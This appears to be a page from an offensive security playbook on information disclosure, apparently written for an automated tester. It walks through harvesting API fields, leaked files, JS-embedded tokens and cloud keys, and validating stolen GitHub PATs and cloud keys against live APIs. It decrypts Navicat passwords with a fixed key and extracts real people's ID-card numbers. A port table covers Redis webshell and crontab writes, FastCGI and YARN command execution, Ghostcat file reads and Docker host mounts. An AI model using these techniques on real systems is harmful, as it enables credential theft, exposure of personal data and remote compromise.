> Whether to write up follows only `../rules/report-format.md`. This page tests: version/framework/health/no-credential-shell/fingerprint → keep digging for full credentials, keys, and cross-tenant business data. When you copy out credentials/cloud keys/tokens: cross-check against a fake value; only submit after a real key has pulled out an identity or a list, then hit a read-only case that doesn't affect production; phone-number encrypt/decrypt keys are not written up.
> Structure: this page is short; you can read it whole. Middleware ports are attacked only when seen (§5); port-scanning every site up front is not the play.

# Information Disclosure Testing Handbook

## 1. Common Leak Points

### 1.1 Over-Exposing API Response Fields

```bash
# Test whether the login/user-info API returns sensitive fields
curl "https://target.com/api/user/info" \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool

# Fields of interest:
# password, passwordHash, salt
# idCard, bankCard, realName
# phone (unmasked), email
# secretKey, apiKey, token
# internal fields: is_admin, role, balance_internal
```

### 1.2 Error-Message Leaks

```bash
# Send malformed requests to trigger errors
curl "https://target.com/api/user?id='"
curl "https://target.com/api/user?id[]=1"

# In the response, watch for:
# Database errors (SQL statements exposed)
# Stack trace (code paths exposed)
# Internal IP addresses
# Framework/version info
```

---

## 2. File/Directory Leaks

### 2.1 Common Sensitive Paths

```bash
# Developer leftover files
/.git/config
/.git/HEAD
/.svn/entries
/.DS_Store
/.env
/.env.local
/.env.production
/config.php
/config.yml
/application.properties
/application.yml
/web.config

# Backup files
/index.php.bak
/index.php~
/backup.zip
/backup.tar.gz
/www.zip
/site.tar.gz
/db.sql
/database.sql

# API docs (may leak the endpoint list)
/swagger-ui.html
/api-docs
/v2/api-docs
/swagger.json
/openapi.json
/doc.html
/redoc

# Monitoring/ops endpoints
/actuator
/actuator/env
/actuator/mappings
/actuator/beans
/metrics
/health
/info
```

### 2.2 Automated Scanning

```bash
# ffuf bulk detection
ffuf -u "https://target.com/FUZZ" \
  -w sensitive_paths.txt \
  -mc 200,301,302,403 \
  -t 30 -o leaks.json -of json

# Filter 403 from ffuf results (may have content but be blocked; worth digging into)
cat leaks.json | python3 -c "
import json, sys
data = json.load(sys.stdin)
for r in data['results']:
    print(f\"{r['status']} {r['url']} ({r['length']} bytes)\")
"
```

---

## 3. JS File Information Leaks

```bash
# Extract sensitive info from JS files
# After downloading all JS, search:
grep -rE "(apiKey|api_key|secret|password|token|ak|sk)\s*[=:]\s*['\"][^'\"]{8,}" *.js

# AK/SK leaks (cloud service credentials)
grep -E "AKID[A-Za-z0-9]{16,}" *.js       # cloud vendor AK prefix
grep -E "LTAI[A-Za-z0-9]{16,}" *.js       # cloud vendor AK prefix
grep -E "AKIA[A-Za-z0-9]{16,}" *.js       # AWS
grep -E "[a-zA-Z0-9+/]{40}=" *.js         # suspected Base64 key

# GitHub PAT (docs/community sites often bundle contributor-plugin keys into the bundle)
grep -oE "ghp_[A-Za-z0-9]{20,}" *.js
grep -oE "github_pat_[A-Za-z0-9_]{20,}" *.js

```

### 3.1 Docs-Site GitHub PAT

Open-source docs/community frontends often bundle `ghp_` / `github_pat_` into their packaged JS so they can pull GitHub org, contributor, and star data from the client.

Copy it out of the JS without logging in:

```bash
curl -s "https://api.github.com/user" -H "Authorization: token $PAT"
# Cross-check: without the header it should return 401
curl -s "https://api.github.com/user/repos?affiliation=owner&per_page=5" -H "Authorization: token $PAT"
```

Counts as success: `me` is a real person's login/name, and that account has `permissions.admin=true` on its repos (it can be used as that GitHub account). Even if the official org repo only has pull access, still write the personal-repo admin into the impact.

Dead ends: key revoked; `/user` returns 401; it's only a GitHub App installation token reading a public org. Actual key values go only into the formal report, not into this page.

### viewer JS XOR-hides a permanent object-storage key (pointer in quick-hits)

Recognize: the landing page/viewer JS has `usePrivateCode` (or a similar function name), and the `COS_TOKEN` SECRET_ID/SECRET_KEY is not a plaintext AKID. Encoding: the first 16 characters serve as the cycling XOR key; only after XOR-decoding the following hex block do you get the permanent AK/SK. Grepping only for `AKID` would conclude there's no key.

Hit (no login): after decoding, sign the cloud STS API **GetCallerIdentity**, then the cloud CAM API **GetUserAppId**. Don't stop on a 403 from ListBuckets.

Counts as success: you recover AccountId/Uin/AppId. A long-lived key, not a temp token that expires in minutes.

Dead ends: decoding then calling the cloud API returns AuthFailure; `exampleValue` decodes to the `hello_world` placeholder. Actual key values go only into the formal report, not into this page. Don't delete this quick-hits row just because one site didn't hit.

### Admin-console JS hardcodes a CI repo key (pointer in quick-hits)

Recognize: the admin-console frontend JS hardcodes the CI `pipelineId` + base64 `auth`, and there is an unauthenticated trigger entry point.

Hit (no login): copy the auth and call the Git-hosting open API open-api `DescribeMyDepots`; the on-site trigger is only for cross-checking.

Counts as success: you list his team's private repo names/HttpsUrl/ProjectId, or the key scope includes `depot_read` and the open API accepts the key.

Dead ends: key expired; the repos are public; only the trigger responds with the product taken offline, with no proof the key can still list private repos. Actual key values go only into the formal report, not into this page. Don't delete this quick-hits row just because one site didn't hit.

### Real ID-card samples inside a documentation chunk (pointer in quick-hits)

Recognize: an open-platform docs center; the page's docs/category API returns 401; the entry script has a DocPage dynamically `import()`-ing `technical-document` (or a similar docs chunk). This is not the "debug docs hardcode an AppSecret" row.

Hit (no login): don't stop on a 401 from the docs API. Follow the home script → DocPage `import()` → the docs chunk. Extract the ID-card number, phone, and name from the sample request/response messages. Only proceed once the check digit passes.

Counts as success: an ID-card number that passes the check digit plus a name/phone that match a real person.

Dead ends: Zhang San / 110101 placeholders; fabricated numbers that fail the check digit; empty `appliIdNo` templates; only public product manuals with no sample messages. Don't delete this quick-hits row just because one site didn't hit. Actual ID-card values go only into the formal report.

### Connection config inside an anonymously-fetchable signed package (pointer in quick-hits)

Recognize: the enterprise software center shows a login page to people; there is also an object-storage fetch-with-signature endpoint that needs no Cookie; or the same site's `/download/`+software-filename needs no Cookie; the archive contains a Navicat `ncx` (connection name, Host, account, `SavePassword` ciphertext). When the homepage 302s to a login wall, **an inline signing function inside the 302 response body also counts as an entry point** — don't only look at the landing login page.

Hit (no login): pull the signed URL from the signing endpoint and Range-GET the real zip. **Don't stop if the signing endpoint is missing or requires login**: from the filename in the 302 body or the homepage software list, download directly via `GET /download/{filename}` on the same site (a random filename usually 302s back to the homepage; only a matching name returns 200). Extract the `*.ncx`. Decrypt the Password with Navicat 12's fixed key `libcckeylibcckey` and IV `libcciv libcciv` using AES-128-CBC, stripping PKCS7.

Counts as success: internal-database Host + account + plaintext password. Actual key values go only into the formal report.

Dead ends: the archive only has the public client with no connection config; the ciphertext won't decrypt. Don't delete this quick-hits row just because one site didn't hit.

### Unauthorized user keys from a distributed-filesystem master (pointer in quick-hits)

Recognize: public HTTP `/version` returns `"Model":"master"` (a distributed-filesystem cluster). The admin API requires no login.

Hit (no login):

1. `GET /user/list` to grab `access_key`+`secret_key`
2. Cross-check: a fake 16-char ak against `GET /user/akInfo?ak=` should return `access key not exists`; a real ak returns `user_id`/user_type
3. `GET /admin/getVol?name=` to view his user's business volume (Owner / InodeCount)

Counts as success: full AK/SK and a real key that reveals an identity / another user's business volume.

Dead ends: only version/cluster name with no keys; empty list; real and fake keys return the same line; only your own empty test volume. Actual key values go only into the formal report, not into this page. Don't delete this quick-hits row just because one site didn't hit.

```bash
# Internal address leaks
grep -oE "192\.168\.[0-9]{1,3}\.[0-9]{1,3}" *.js
grep -oE "10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" *.js
grep -oE "172\.(1[6-9]|2[0-9]|3[01])\.[0-9]{1,3}\.[0-9]{1,3}" *.js
```

---

## 4. Special-Endpoint Leaks

### 4.1 Out-of-Bounds Pagination

```bash
# Large page number to dump all data
?page=99999&pageSize=1000
?offset=0&limit=99999

# Export endpoint with no count limit
/api/export/users?format=csv
/api/export/orders?startTime=2020-01-01&endTime=2026-01-01
```

### 4.2 Wildcards in Search Endpoints

```bash
# Fuzzy search to dump all data
?keyword=%         # URL-encoded %, SQL LIKE wildcard
?keyword=*
?keyword=.         # some systems
?q=               # empty search returns everything
```

### 4.3 GraphQL Introspection

```bash
# GraphQL endpoint leaks the schema
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name } } } }"}'

# If it returns the full schema → may leak undocumented endpoints and fields
```

---

## 5. How to Attack Middleware Ports When You See Them

> **Hit only when seen.** Don't start every site with a full-port nmap. Only after asset mapping / engagement / response headers have already exposed these ports or consoles do you work the table. When you land something, write it up per `../rules/report-format.md`; keep chasing credentials behind a health/version shell, don't stop at PONG.

| What you see | Where to hit | What counts as success | Dead ends / where to go |
|--------|------|------------|-------------|
| `:6379` Redis, passwordless `PING`→`PONG` | write webshell / crontab / `authorized_keys` (the directory must be a real web root or cron). If SSRF reaches this port, use `gopher://`; see `ssrf-test.md` | your command runs, or you read a business database | `requirepass` set; `CONFIG` renamed; `PING` only |
| `:873` rsync, anonymous `rsync host::` lists modules | download business files; if the module is writable, see whether you can write cron | you pull keys/business data | empty modules; read-only and all public static content |
| `:9000` PHP-FPM/FastCGI directly exposed | FastCGI packet against an existing `.php` (`PHP_VALUE=auto_prepend_file=php://input`). For SSRF use gopherus fastcgi | the target PHP executes | Unix socket only; external 9000 isn't FPM |
| `:8009` AJP | Ghostcat to read `/WEB-INF/web.xml`. See `path-traversal-lfi-test.md` §21 | read web.xml / class | `secretRequired`; port isn't AJP |
| `:8088` Hadoop YARN UI | `POST /ws/v1/cluster/apps/new-application`, then submit an app with `commands` | your command runs in the cluster | UI login wall only; submission 401s |
| `:2375` Docker API | `GET /v1.24/containers/json`; if you can create, mount `/:/host` | list containers or read host files | TLS 2376 without client cert; version only |
| `/h2-console` | JDBC URL JNDI or `CREATE ALIAS`. See "H2 Console" in `jndi-injection-test.md` | your command runs | only reachable locally |

Hitting from the public internet and hitting internal networks via SSRF are the same sink; the only difference is the entry point. Don't scan just to populate this table if these ports aren't present.
